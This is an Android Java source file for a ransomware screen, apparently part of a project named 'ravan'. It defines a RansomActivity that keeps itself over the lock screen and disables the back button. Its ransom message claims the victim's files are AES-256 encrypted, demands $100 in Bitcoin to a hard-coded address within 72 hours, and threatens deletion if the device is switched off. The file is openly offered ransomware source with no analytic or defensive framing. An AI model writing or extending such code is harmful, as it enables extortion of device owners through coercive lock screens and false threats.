package com.security.ravan;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.WindowManager;
import android.widget.TextView;

public class RansomActivity extends Activity {
    
    private static final String BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    private static final int RANSOM_AMOUNT = 100;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // قفل صفحه و جلوگیری از خروج
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        
        setContentView(R.layout.activity_ransom);
        
        TextView tvMessage = findViewById(R.id.tv_message);
        tvMessage.setText("⚠️⚠️⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️⚠️⚠️\n\n" +
                "All your personal files (photos, videos, documents, etc.) have been encrypted with AES-256.\n\n" +
                "To decrypt your files, you need to pay:\n" +
                "💰 $" + RANSOM_AMOUNT + " in Bitcoin\n\n" +
                "🏦 Bitcoin Address:\n" + BTC_ADDRESS + "\n\n" +
                "⛔ DO NOT TURN OFF YOUR DEVICE!\n" +
                "If you turn off the device, ALL FILES WILL BE PERMANENTLY DELETED!\n\n" +
                "After payment, contact: ransom@example.com\n\n" +
                "You have 72 hours to pay. After that, the decryption key will be destroyed.");
        
        // جلوگیری از بک و هوم
        // (در اندروید جدید محدودیت وجود دارد)
    }
    
    @Override
    public void onBackPressed() {
        // غیرفعال
    }
}
